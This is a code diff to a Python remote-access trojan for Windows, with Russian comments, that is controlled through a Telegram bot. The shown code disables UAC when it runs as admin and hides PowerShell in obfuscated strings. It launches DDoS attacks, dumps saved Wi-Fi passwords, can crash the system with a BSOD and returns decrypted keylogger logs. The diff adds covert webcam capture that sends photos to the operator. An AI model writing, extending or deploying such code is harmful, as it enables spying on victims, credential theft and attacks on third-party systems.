@@ -10,6 +10,8 @@ import pyautogui
 import keyboard
 import telebot
 from cryptography.fernet import Fernet
+import cv2
+
 
 name_file = "config"
 
@@ -64,7 +66,8 @@ class Logger_Bot:
 
     def __save_log(self, text: str):
 
-        name_file = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ', '_').replace(':', '-') + ".txt"
+        name_file = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ',
+                                                                                     '_').replace(':', '-') + ".txt"
 
         if os.path.exists(name_file):
 
@@ -104,12 +107,12 @@ class Logger_Bot:
                 data2 = file.read()
             key = data2[:22] + data2[-22:]  # чтение ключа
             f = Fernet(key)
-            
+
             with open(self.path + name_file, 'rb') as file:
                 data3 = file.read()[22:-22]
 
             data3 = f.decrypt(data3).decode().replace("&#", "\n")
-
+            print(data3)
             with open(self.dump+name_file, 'w') as file:
                 file.write(data3)
             return self.dump+name_file
@@ -141,7 +144,8 @@ class Func_API:
         for ids in id:
             try:
                 if ctypes.windll.shell32.IsUserAnAdmin():
-                    bot.send_message(ids, f'{self.NAME_PC} запущен от имени администратора')
+                    bot.send_message(
+                        ids, f'{self.NAME_PC} запущен от имени администратора')
 
                     if not Data.uic:  # Отрубает UAC
                         try:
@@ -152,11 +156,14 @@ class Func_API:
                             subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
                             decrypted_text[4] = "1"
-                            decrypted_text = " ".join(decrypted_text).encode('utf-8')
-                            encrypted_text = key[:22] + f.encrypt(decrypted_text) + key[-22:]
+                            decrypted_text = " ".join(
+                                decrypted_text).encode('utf-8')
+                            encrypted_text = key[:22] + \
+                                f.encrypt(decrypted_text) + key[-22:]
 
                             with open('config', 'wb') as file:
-                                file.write(encrypted_text)  # изменение записи конфига об UIC
+                                # изменение записи конфига об UIC
+                                file.write(encrypted_text)
 
                         except Exception as e:
                             logger.log("disable_UAC", e)
@@ -324,7 +331,7 @@ class Func_API:
         pwrshl_ram = "&((gv '*mDr*').NAME[3,11,2]-JOIn'') ((('G'+'et-W'+'miObje'+'ct '+'Wi'+'n'+'32_'+'P'+'hysi'+'calMemo'+'ry '+'{0} '+'Measure-'+'Ob'+'j'+'ect -'+'Pro'+'per'+'ty c'+'apacity'+' -Sum') -f[chaR]124) )"
         ram = int(self.cmdo_ret(
             f'powershell "{pwrshl_ram}"').split("\n")[
-                      5].split(': ')[1][:-1]) // 1073741824
+            5].split(': ')[1][:-1]) // 1073741824
         pwrshl_vid = ".( ([striNg]$vERbOSEpRefErENCE)[1,3]+'x'-joIn'')((('Ge'+'t-W'+'miObje'+'ct Wi'+'n'+'3'+'2'+'_VideoC'+'o'+'n'+'tro'+'ller '+'{'+'0} sele'+'ct Name')  -F[cHAr]124))"
         vid = self.cmdo_ret(f'powershell "{pwrshl_vid}"').split('\n')[4][:-1]
         banner = f"""Name PC:   {platform.node()}
@@ -457,7 +464,8 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
             # Отправляем сообщение о начале DDOS атаки
             bot.send_message(self.id, f'DDOS атака на {url} успешно запущена')
         else:
-            bot.send_message(self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')
+            bot.send_message(
+                self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')
 
         while True:
             try:
@@ -495,15 +503,18 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
     def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
         try:
             otv = ''
-            profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
-            profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
+            profiles_data = subprocess.check_output(
+                'netsh wlan show profiles').decode('utf-8').split('\n')
+            profiles = [i.split(':')[1].strip()
+                        for i in profiles_data if 'All User Profile' in i]
 
             for profile in profiles:
                 profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(
                     'utf-8').split('\n')
 
                 try:
-                    password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
+                    password = [i.split(':')[1].strip()
+                                for i in profile_info if 'Key Content' in i][0]
                 except IndexError:
                     password = None
                 otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
@@ -511,6 +522,29 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
         except Exception as e:
             logger.log(self.extract_wifi_passwords.__name__, e)
             bot.send_message(self.id, f'Ошибка: {e}')
+
+    def webcam(self):
+        try:
+            name = f"{self.NAME_PC}_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
+            cap = cv2.VideoCapture(0)
+            for i in range(10):
+                cap.read()
+
+            ret, frame = cap.read()
+            cv2.imwrite(name, frame)
+
+            cap.release()
+            f = open(name, 'rb')
+            bot.send_document(self.id, f)
+            f.close()
+            os.remove(name)
+
+        except Exception as e:
+            logger.log(self.webcam.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
+
+        except:
+            print('*Webcam not found*')
 
     def bsod(self):
         nullptr = ctypes.POINTER(ctypes.c_int)()
@@ -530,19 +564,20 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
             ctypes.c_uint(6),
             ctypes.byref(ctypes.c_uint())
         )
+
     def loggs(self, dat):
         namer = f'log_{dat}.txt'
         answer = logger.get_log(namer)
         try:
             if answer:
-                f = open(answer,'rb')
+                f = open(answer, 'rb')
                 bot.send_document(self.id, f)
                 f.close()
                 os.remove(answer)
         except Exception as e:
             logger.log(self.loggs.__name__, e)
             bot.send_message(self.id, f'Ошибка: {e}')
-        
+
     def perfor(self, text, id_chat):  # главный обработчик
         try:
             self.id = id_chat
@@ -593,10 +628,15 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
 
                 if comnd == "dir" or comnd == "direction":
                     self.direct(text_comand[0])
+
                 if comnd == "log":
                     self.loggs(text_comand[0])
+
                 if comnd == "screenshot" or comnd == "scrn":
                     self.screenshot()
+
+                if comnd == "webcam" or comnd == "wcam":
+                    self.webcam()
 
                 if comnd == "inpt" or comnd == "input":
                     target = self.input_gui(text_comand[0])
